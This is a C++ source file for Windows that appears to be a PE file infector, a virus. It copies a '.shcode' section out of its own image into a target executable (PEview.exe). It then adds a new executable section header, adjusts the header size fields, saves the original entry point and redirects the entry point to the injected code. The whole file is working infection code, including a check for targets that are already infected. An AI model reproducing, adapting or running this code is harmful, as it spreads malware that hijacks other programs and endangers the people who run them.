#include <windows.h>
#include <iostream>
#include <fstream>

int main()
{
    char TargFile[] = "PEview.exe";

    std::cout << "Start getting info..." << std::endl;

    std::cout << "\n***SELF infect.exe INFO BELOW***" << std::endl;

    // Get PE file address in memory
    HMODULE hMod = GetModuleHandle(NULL);
    if (hMod == NULL) {
        std::cerr << "Failed to get module handle: " << GetLastError() << std::endl;
        system("PAUSE");
        return 1;
    }
    std::cout << "Module handle: " << hMod << std::endl;

    // Get DOS header address in memory
    IMAGE_DOS_HEADER* DOSHeader = (IMAGE_DOS_HEADER*)hMod;
    std::cout << "DOS header address in memory: " << (PVOID)DOSHeader << std::endl;

    // Check DOS "MZ"
    if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Invalid PE signature!!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get NT headers address in file
    IMAGE_NT_HEADERS32* NTHeader = (IMAGE_NT_HEADERS32*)((BYTE*)DOSHeader + DOSHeader->e_lfanew);
    std::cout << "NT headers address in file: " << (PVOID)NTHeader << std::endl;

    // Check NT "PE"
    if (NTHeader->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Invalid PE signature!!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get the number of sections
    // Get the size of optional header
    // Get the section alignment
    std::cout << "The number of sections: " << std::hex << NTHeader->FileHeader.NumberOfSections << std::endl;
    std::cout << "The size of optional header: " << std::hex << NTHeader->FileHeader.SizeOfOptionalHeader << std::endl;
    std::cout << "The section alignment: " << std::hex << NTHeader->OptionalHeader.SectionAlignment << std::endl;

    // Get the virtual address & size of shellcode section
    IMAGE_SECTION_HEADER ShcodeHdr = { 0 };
    IMAGE_SECTION_HEADER* SectHeader = IMAGE_FIRST_SECTION(NTHeader);
    for (int i = 0; i < NTHeader->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)SectHeader->Name, ".shcode") == 0) {
            ShcodeHdr = *SectHeader;
            break;
        }
        SectHeader++;
    }
    SectHeader = NULL;
    if (strcmp((char*)ShcodeHdr.Name, ".shcode") != 0) {
        std::cerr << "None section named \".shcode\"!" << std::endl;
        system("PAUSE");
        return 1;
    }
    std::cout << "The RVA of shellcode section: " << std::hex << ShcodeHdr.VirtualAddress << std::endl;
    std::cout << "The virtual size of shellcode section: " << std::hex << ShcodeHdr.Misc.VirtualSize << std::endl;


    std::cout << "\n***TARGET FILE " << TargFile << " INFO BELOW***" << std::endl;

    // Open target file
    std::fstream target(TargFile, std::ios::in | std::ios::out | std::ios::binary);

    if (!target.is_open()) {
        std::cerr << "Failed to open file." << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get the size of target file
    target.seekg(0, std::ios::end);
    std::streampos TargSize = target.tellg();

    // Get DOS header of target file
    IMAGE_DOS_HEADER TargDOSHeader = { 0 };
    target.seekg(0, std::ios::beg);
    target.read(reinterpret_cast<char*>(&TargDOSHeader), sizeof(TargDOSHeader));

    // Check DOS "MZ"
    if (TargDOSHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Invalid PE signature!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get offset to NT headers in target file
    std::streampos TargNTOffset = TargDOSHeader.e_lfanew;

    // Get NT header of target file
    IMAGE_NT_HEADERS32 TargNTHeader = { 0 };
    target.seekg(TargNTOffset, std::ios::beg);
    target.read(reinterpret_cast<char*>(&TargNTHeader), sizeof(TargNTHeader));

    // Check NT "PE"
    if (TargNTHeader.Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Invalid PE signature!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get offset to section headers begin and end in target file
    std::streampos TargSectHdrsBeg = TargNTOffset;
    TargSectHdrsBeg += sizeof(IMAGE_NT_HEADERS32);
    std::streampos TargSectHdrsEnd = TargSectHdrsBeg;
    TargSectHdrsEnd += TargNTHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);

    // Check if there is enough space to add the section header of .shcode
    if (TargNTHeader.OptionalHeader.SizeOfHeaders - TargSectHdrsEnd < sizeof(IMAGE_SECTION_HEADER)) {
        std::cerr << "No enough space to add section!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Get the last section header in target file
    // Check if infected
    IMAGE_SECTION_HEADER TargLastSectHdr = { 0 };
    std::streampos TargLastSectHdrBeg = TargSectHdrsEnd;
    TargLastSectHdrBeg -= sizeof(IMAGE_SECTION_HEADER);
    target.seekg(TargLastSectHdrBeg, std::ios::beg);
    target.read(reinterpret_cast<char*>(&TargLastSectHdr), sizeof(TargLastSectHdr));
    if (strcmp((char*)TargLastSectHdr.Name, ".shcode") == 0) {
        std::cerr << "Has been infected!!" << std::endl;
        system("PAUSE");
        return 1;
    }

    // Set the new section header of .shcode
    IMAGE_SECTION_HEADER TargShcodeHdr = { 0 };
    memcpy(TargShcodeHdr.Name, ShcodeHdr.Name, 0x08);
    TargShcodeHdr.Misc.VirtualSize = ShcodeHdr.Misc.VirtualSize;
    TargShcodeHdr.VirtualAddress = TargLastSectHdr.VirtualAddress + (TargLastSectHdr.Misc.VirtualSize / TargNTHeader.OptionalHeader.SectionAlignment + 1) * TargNTHeader.OptionalHeader.SectionAlignment;
    TargShcodeHdr.SizeOfRawData = (ShcodeHdr.Misc.VirtualSize / TargNTHeader.OptionalHeader.FileAlignment + 1) * TargNTHeader.OptionalHeader.FileAlignment;
    TargShcodeHdr.PointerToRawData = TargSize;
    TargShcodeHdr.PointerToRelocations = 0;
    TargShcodeHdr.PointerToLinenumbers = 0;
    TargShcodeHdr.NumberOfRelocations = 0;
    TargShcodeHdr.NumberOfLinenumbers = 0;
    TargShcodeHdr.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;


    std::cout << "\nStart modifying target..." << std::endl;

    // Modify the number of sections in target file
    std::streampos TargNumOfSectOffset = TargNTOffset;
    TargNumOfSectOffset += 0x06;
    target.seekp(TargNumOfSectOffset, std::ios::beg);
    WORD TargNewNumOfSect = TargNTHeader.FileHeader.NumberOfSections + 1;
    target.write(reinterpret_cast<char*>(&TargNewNumOfSect), sizeof(TargNewNumOfSect));

    // Modify the size of code in target file
    std::streampos TargSizeOfCodeOffset = TargNTOffset;
    TargSizeOfCodeOffset += 0x1C;
    target.seekp(TargSizeOfCodeOffset, std::ios::beg);
    DWORD TargNewSizeOfCode = TargNTHeader.OptionalHeader.SizeOfCode + TargShcodeHdr.SizeOfRawData;
    target.write(reinterpret_cast<char*>(&TargNewSizeOfCode), sizeof(TargNewSizeOfCode));

    // Modify the size of image in target file
    std::streampos TargSizeOfImgOffset = TargNTOffset;
    TargSizeOfImgOffset += 0x50;
    target.seekp(TargSizeOfImgOffset, std::ios::beg);
    DWORD TargNewSizeOfImg = TargNTHeader.OptionalHeader.SizeOfImage + (ShcodeHdr.Misc.VirtualSize / TargNTHeader.OptionalHeader.SectionAlignment + 1) * TargNTHeader.OptionalHeader.SectionAlignment;
    target.write(reinterpret_cast<char*>(&TargNewSizeOfImg), sizeof(TargNewSizeOfImg));

    // Insert new section header to target file
    target.seekp(TargSectHdrsEnd, std::ios::beg);
    target.write(reinterpret_cast<char*>(&TargShcodeHdr), sizeof(TargShcodeHdr));

    // Insert new section to target file
    target.seekp(0, std::ios::end);
    PVOID TargNewSect = malloc(TargShcodeHdr.SizeOfRawData);
    memset(TargNewSect, 0xcc, TargShcodeHdr.SizeOfRawData);
    memcpy(TargNewSect, reinterpret_cast<char*>(reinterpret_cast<char*>(hMod) + ShcodeHdr.VirtualAddress), ShcodeHdr.Misc.VirtualSize);
    target.write(reinterpret_cast<char*>(TargNewSect), TargShcodeHdr.SizeOfRawData);
    free(TargNewSect);

    // Save and modify entry point in target file
    std::streampos TargOldEntryPointOffset = TargNTOffset;
    TargOldEntryPointOffset -= 0x04;
    target.seekp(TargOldEntryPointOffset, std::ios::beg);
    target.write(reinterpret_cast<char*>(&TargNTHeader.OptionalHeader.AddressOfEntryPoint), 0x04);
    std::streampos TargEntryPointOffset = TargNTOffset;
    TargEntryPointOffset += 0x28;
    target.seekp(TargEntryPointOffset, std::ios::beg);
    target.write(reinterpret_cast<char*>(&TargShcodeHdr.VirtualAddress), 0x04);

    std::cout << "Done." << std::endl;


    system("PAUSE");
    return 0;
}